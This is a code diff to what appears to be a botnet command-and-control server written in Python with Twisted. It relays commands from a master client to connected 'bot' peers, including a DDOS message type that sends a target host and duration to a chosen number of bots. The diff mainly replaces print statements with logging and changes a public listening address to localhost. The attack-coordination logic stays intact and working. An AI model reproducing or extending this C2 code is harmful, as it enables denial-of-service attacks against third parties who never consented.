@@ -2,6 +2,8 @@
 
 from twisted.internet import protocol, reactor, endpoints
 from twisted.internet.task import LoopingCall
+import logging
+import logger
 
 #Messages for peers
 peer_msg = [] 
@@ -25,8 +27,7 @@ class echoPeer(protocol.Protocol):
         self.factory.peers[self.peer_id] = self #Peers connection
         ip_list.append(self.peer_id)
         cnt_clients += 1
-        print('[*] Peer %s:%s connected' %(self.peer_host, self.peer_port))
-        print('[#] Status [%s]' %(cnt_clients))		
+        logging.debug('Peer %s:%s connected' %(self.peer_host, self.peer_port))
 
     def connectionLost(self, reason):
         global cnt_clients
@@ -34,12 +35,11 @@ class echoPeer(protocol.Protocol):
         self.factory.peers.pop(self.peer_id, None)
         cnt_clients -= 1
         ip_list.remove(self.peer_id)  
-        print('[*] Peer %s:%s disconnected' %(self.peer_host, self.peer_port))
-        print('[#] Status [%s] ' %(cnt_clients))
+        logging.debug('[*] Peer %s:%s disconnected' %(self.peer_host, self.peer_port))
 
     #Data received from bot
     def dataReceived(self, data):
-        print("[DEBUG] Data received from [%s] -> [%s]" %(self.peer_id, data))
+        logging.debug("Data received from [%s] -> [%s]" %(self.peer_id, data))
         global client_msg
         data = data.decode('utf-8', 'ignore')
         #New message for client
@@ -63,7 +63,7 @@ class peerFactory(protocol.Factory):
                         for peer_id, connection in self.peers.items(): 
                             #Match peer id of message with the id of peers connection
                             if pid == peer_id:
-                                print('[DEBUG] Message [%s] to peer %s' %(peer_cmd, pid))
+                                logging.debug('Message [%s] to peer %s' %(peer_cmd, pid))
                                 self.peers[peer_id].transport.write(peer_cmd.encode('utf-8'))
                                 peer_msg.remove(message)
                     
@@ -71,7 +71,7 @@ class peerFactory(protocol.Factory):
                         ddos_msg = msg[2]
                         max_peers = int(msg[1])
                         n_peers = 1
-                        print('[DEBUG] Sending ddos request...')
+                        logging.debug('Sending ddos request...')
                         for peer_id, connection in self.peers.items():
                             if n_peers <= max_peers:
                                 self.peers[peer_id].transport.write(ddos_msg.encode('utf-8'))
@@ -90,10 +90,10 @@ class peerFactory(protocol.Factory):
 class echoClient(protocol.Protocol):
     def connectionMade(self):
         self.master_host = self.transport.getPeer().host
-        print('*- Master [%s] connected -*' %(self.master_host))
+        logging.debug('*- Client [%s] connected -*' %(self.master_host))
 
     def connectionLost(self, reason):
-        print('*- Master [%s] disconnected -*' %(self.master_host))
+        logging.debug('*- Client [%s] disconnected -*' %(self.master_host))
 
     #Data received from client
     def dataReceived(self, data):
@@ -109,7 +109,6 @@ class echoClient(protocol.Protocol):
                 peer_msg.append(message)
                 self.startBroadcast()
             elif msg_type == 'DDOS':
-                print('[DEBUG] Time %s - peers %s - host %s' %(p_data[1], p_data[2], p_data[3]))
                 ddos_msg = ':'.join([p_data[2], p_data[3]])
                 max_peers = p_data[1]
                 msg = '::'.join(['DDOS',max_peers, ddos_msg])
@@ -128,7 +127,7 @@ class echoClient(protocol.Protocol):
             if client_msg:
                 app_client_msg = client_msg
                 for msg in app_client_msg:
-                    print('[DEBUG] Message to client --> %s' %msg)
+                    logging.debug('Message to client --> %s' %msg)
                     self.transport.write(msg.encode('utf-8')) 
                     client_msg.remove(msg)
                 looping_call.stop()
@@ -150,7 +149,8 @@ if __name__ == '__main__':
                                                       ______ _____  _____ ____
                                                      (_-< -_) __/ |/ / -_) __/
                                                     /___|__/_/  |___/\__/_/   
-    """)                                                                          
+    """)
     endpoints.serverFromString(reactor, "tcp:8081:interface=127.0.0.1").listen(peerFactory())
-    endpoints.serverFromString(reactor, "tcp:8080:interface=167.99.194.11").listen(clientFactory())
+    endpoints.serverFromString(reactor, "tcp:8080:interface=127.0.0.1").listen(clientFactory())
+    logger.start()
     reactor.run()
